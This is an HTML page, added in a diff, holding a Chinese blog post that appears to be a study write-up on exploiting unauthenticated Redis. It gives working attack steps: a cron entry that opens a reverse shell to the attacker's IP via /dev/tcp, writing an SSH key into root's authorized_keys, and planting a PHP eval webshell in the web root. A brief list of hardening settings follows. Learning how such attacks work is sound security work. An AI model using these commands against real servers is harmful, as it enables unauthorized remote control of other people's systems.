@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="noodp" name="robots"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<title>Redis 未授权访问 - X5tar's Blog</title><meta content="" name="Description"/><meta content="Redis 未授权访问" property="og:title"/>
+<meta content="0x00 前言 刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法 0x01 Redis 介绍 Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内" property="og:description"/>
+<meta content="article" property="og:type"/>
+<meta content="https://x5tar.com/posts/redis-unauthorized-access/" property="og:url"/><meta content="posts" property="article:section"/>
+<meta content="2020-06-23T21:12:30+08:00" property="article:published_time"/>
+<meta content="2020-06-23T21:12:30+08:00" property="article:modified_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="Redis 未授权访问" name="twitter:title"/>
+<meta content="0x00 前言 刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法 0x01 Redis 介绍 Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内" name="twitter:description"/>
+<meta content="X5tar's Blog" name="application-name"/>
+<meta content="X5tar's Blog" name="apple-mobile-web-app-title"/><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/><link href="/site.webmanifest" rel="manifest"/><link href="https://x5tar.com/posts/redis-unauthorized-access/" rel="canonical"/><link href="https://x5tar.com/posts/linux-crontab/" rel="prev"/><link href="/lib/normalize/normalize.min.css" rel="stylesheet"/><link href="/css/style.min.css" rel="stylesheet"/><link href="/lib/fontawesome-free/all.min.css" rel="stylesheet"/><link href="/lib/animate/animate.min.css" rel="stylesheet"/><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Redis 未授权访问",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/x5tar.com\/posts\/redis-unauthorized-access\/"
+        },"genre": "posts","keywords": "WEB安全, Redis","wordcount":  1052 ,
+        "url": "https:\/\/x5tar.com\/posts\/redis-unauthorized-access\/","datePublished": "2020-06-23T21:12:30+08:00","dateModified": "2020-06-23T21:12:30+08:00","publisher": {
+            "@type": "Organization",
+            "name": "X5tar"},"author": {
+                "@type": "Person",
+                "name": "X5tar"
+            },"description": ""
+    }
+    </script></head>
+<body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+<div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu">
+<div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+<input id="search-input-desktop" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-desktop" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-desktop" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-desktop">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class="mobile" id="header-mobile">
+<div class="header-container">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu-toggle" id="menu-toggle-mobile">
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class="menu" id="menu-mobile"><div class="search-wrapper">
+<div class="search mobile" id="search-mobile">
+<input id="search-input-mobile" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-mobile" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-mobile" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-mobile">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a class="search-cancel" href="javascript:void(0);" id="search-cancel-mobile">
+                        取消
+                    </a>
+</div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+<div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+<div class="container"><div class="toc" id="toc-auto">
+<h2 class="toc-title">目录</h2>
+<div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Redis 未授权访问</h1><div class="post-meta">
+<div class="post-meta-line"><span class="post-author"><a class="author" href="/" rel="author" title="Author"><i class="fas fa-user-circle fa-fw"></i>X5tar</a></span> <span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+<div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i> <time datetime="2020-06-23">2020-06-23</time> <i class="fas fa-pencil-alt fa-fw"></i> 约 1052 字 
+                <i class="far fa-clock fa-fw"></i> 预计阅读 3 分钟 </div>
+</div><div class="details toc" id="toc-static" kept="">
+<div class="details-summary toc-title">
+<span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-前言">0x00 前言</a></li>
+<li><a href="#0x01-redis-介绍">0x01 Redis 介绍</a></li>
+<li><a href="#0x02-环境搭建">0x02 环境搭建</a></li>
+<li><a href="#0x03-利用方法">0x03 利用方法</a>
+<ul>
+<li><a href="#1-利用-cron-定时任务反弹-shell">1. 利用 Cron 定时任务反弹 shell</a></li>
+<li><a href="#2-写入公钥并利用-ssh-连接">2. 写入公钥并利用 ssh 连接</a></li>
+<li><a href="#3-写入-webshell">3. 写入 webshell</a></li>
+<li><a href="#4-利用-lua-脚本进行操作">4. 利用 lua 脚本进行操作</a></li>
+<li><a href="#5-其它方法">5. 其它方法</a></li>
+</ul>
+</li>
+<li><a href="#0x04-安全配置">0x04 安全配置</a></li>
+</ul>
+</nav></div>
+</div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
+<p>刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法</p>
+<h2 id="0x01-redis-介绍">0x01 Redis 介绍</h2>
+<p>Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库</p>
+<p>Redis 通常将全部的数据存储在内存中，但也可以将数据持久化存储在硬盘中（数据持久化给了我们利用的机会）</p>
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p>安装 redis 后，在配置文件 <code>redis.conf</code> 中 <code>bind 127.0.0.1 ::1</code> 一行前加 <code>#</code> 将其注释，并将 <code>protected-mode</code> 设为 <code>no</code> ，然后启动 redis-server</p>
+<p>然后在攻击机上输入 <code>redis-cli -h 目标IP</code> 命令连接目标机器的 redis-server，若连接成功则环境搭建完成</p>
+<h2 id="0x03-利用方法">0x03 利用方法</h2>
+<h3 id="1-利用-cron-定时任务反弹-shell">1. 利用 Cron 定时任务反弹 shell</h3>
+<blockquote>
+<p>关于 Linux Cron 定时任务见另一篇博客 [<a href="https://x5tar.com/2020/06/21/linux-crontab/" rel="noopener noreffer" target="_blank">Linux Cron 定时任务</a>](<a href="https://x5tar.com/2020/06/21/linux-crontab/">https://x5tar.com/2020/06/21/linux-crontab/</a>)</p>
+<p><strong>本方法适用于目标机器以 root 身份启动 Redis 的情况</strong></p>
+</blockquote>
+<p>先在攻击机上监听任意端口 <code>nc -lvvp Port</code></p>
+<p>然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/攻击机IP/Port 0&gt;&amp;1\n"
+OK
+&gt; config set dir /var/spool/cron/
+OK
+&gt; config set dbfilename root
+OK
+&gt; save
+OK
+</code></pre></td></tr></table>
+</div>
+</div><p>稍等片刻即可在攻击机接收到回弹的 shell</p>
+<p>若长时间未接收到，可尝试将第二行命令中的目录改为 <code>/var/spool/cron/crontabs</code> 再次尝试</p>
+<h3 id="2-写入公钥并利用-ssh-连接">2. 写入公钥并利用 ssh 连接</h3>
+<blockquote>
+<p><strong>本方法适用于目标机器安装并启动了 ssh server 的情况</strong></p>
+<p>使用本方法需要知道启动 redis 的用户的 home 目录</p>
+</blockquote>
+<p>先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">ssh-keygen -t rsa
+</code></pre></td></tr></table>
+</div>
+</div><p>然后在 <code>~/.ssh</code> 目录下执行以下命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h 目标机器IP -x set x
+</code></pre></td></tr></table>
+</div>
+</div><p>然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 <code>/home</code>）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; config set dir /root/.ssh
+OK
+&gt; config set dbfilename authorized_keys
+OK
+&gt; save
+OK
+</code></pre></td></tr></table>
+</div>
+</div><p>然后在攻击机通过 ssh 连接目标机器即可</p>
+<h3 id="3-写入-webshell">3. 写入 webshell</h3>
+<blockquote>
+<p><strong>本方法适用于 redis 用户权限较低但对 web 目录有写权限的情况</strong></p>
+<p>使用本方法需要知道 web 目录的绝对路径</p>
+</blockquote>
+<p>在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; set x "\n&lt;?php eval($_POST['cmd']); ?&gt;\n"
+OK
+&gt; config set dir /var/www/html
+OK
+&gt; config set dbfilename evil.php
+OK
+&gt; save
+OK
+</code></pre></td></tr></table>
+</div>
+</div><p>然后连接 webshell 即可</p>
+<h3 id="4-利用-lua-脚本进行操作">4. 利用 lua 脚本进行操作</h3>
+<blockquote>
+<p>在其它地方看到的，但是在 Redis 里甚至连 IO 库和 OS 库都不能用，暂未发现可靠的利用方法</p>
+</blockquote>
+<p>从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&gt; eval "return 'hello'" 0
+"hello"
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="5-其它方法">5. 其它方法</h3>
+<p>既然通过 Redis 未授权访问获得了写入文件的权限，则可根据目标机器启动的服务，针对性的使用其它方法进行进一步渗透</p>
+<h2 id="0x04-安全配置">0x04 安全配置</h2>
+<p>Redis 未授权访问危害较大，故根据以上利用方法，可针对性的进行以下配置，增强安全性</p>
+<ol>
+<li>
+<p>仅绑定部分地址，限制可访问的 IP</p>
+</li>
+<li>
+<p>修改 Redis 监听端口</p>
+</li>
+<li>
+<p>为用户设置密码</p>
+</li>
+<li>
+<p>以单独的低权限用户启动 Redis，并禁止登录</p>
+</li>
+<li>
+<p>禁止使用或修改高危命令名称（rename-command）</p>
+</li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+<div class="post-info">
+<div class="post-info-line">
+<div class="post-info-mod">
+<span>更新于 2020-06-23</span>
+</div>
+<div class="post-info-license"></div>
+</div>
+<div class="post-info-line">
+<div class="post-info-md"><span>
+<a class="link-to-markdown" href="/posts/redis-unauthorized-access/index.md" target="_blank">阅读原始文档</a>
+</span></div>
+<div class="post-info-share">
+<span></span>
+</div>
+</div>
+</div>
+<div class="post-info-more">
+<section class="post-tags"><i class="fas fa-tags fa-fw"></i> <a href="/tags/web%E5%AE%89%E5%85%A8/">WEB安全</a>, <a href="/tags/redis/">Redis</a></section>
+<section>
+<span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span> | <span><a href="/">主页</a></span>
+</section>
+</div>
+<div class="post-nav"><a class="prev" href="/posts/linux-crontab/" rel="prev" title="Linux Cron 定时任务"><i class="fas fa-angle-left fa-fw"></i>Linux Cron 定时任务</a></div>
+</div>
+<div id="comments"><div class="comment" id="valine"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+</main><footer class="footer">
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span></div>
+</div>
+</footer></div>
+<div id="fixed-buttons"><a class="fixed-button" href="#" id="back-to-top" title="回到顶部">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a class="fixed-button" href="#" id="view-comments" title="查看评论">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><link href="/lib/valine/valine.min.css" rel="stylesheet"/><link href="/lib/lightgallery/lightgallery.min.css" rel="stylesheet"/><script src="/lib/valine/Valine.min.js" type="text/javascript"></script><script src="/lib/smooth-scroll/smooth-scroll.min.js" type="text/javascript"></script><script src="/lib/autocomplete/autocomplete.min.js" type="text/javascript"></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" type="text/javascript"></script><script src="/lib/lazysizes/lazysizes.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lightgallery.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-thumbnail.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-zoom.min.js" type="text/javascript"></script><script src="/lib/clipboard/clipboard.min.js" type="text/javascript"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"iAbQo5y0XlBlUP9F0K3Tyx8f-MdYXbMMI","appKey":"ML5YMAAFe45gCJawVJcUkrg0","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":null,"highlight":true,"lang":"zh-cn","placeholder":"你的评论 ...","recordIP":null,"visitor":null}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"3M3B3KM4LG","algoliaIndex":"blog","algoliaSearchKey":"babfa85706a3a4a0025db8ff2fdf3525","highlightTag":null,"maxResultLength":null,"noResultsFound":"没有找到结果","snippetLength":null,"type":"algolia"}};</script><script src="/js/theme.min.js" type="text/javascript"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-160185073-2');
+        </script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-160185073-2" type="text/javascript"></script></body>
+</html>
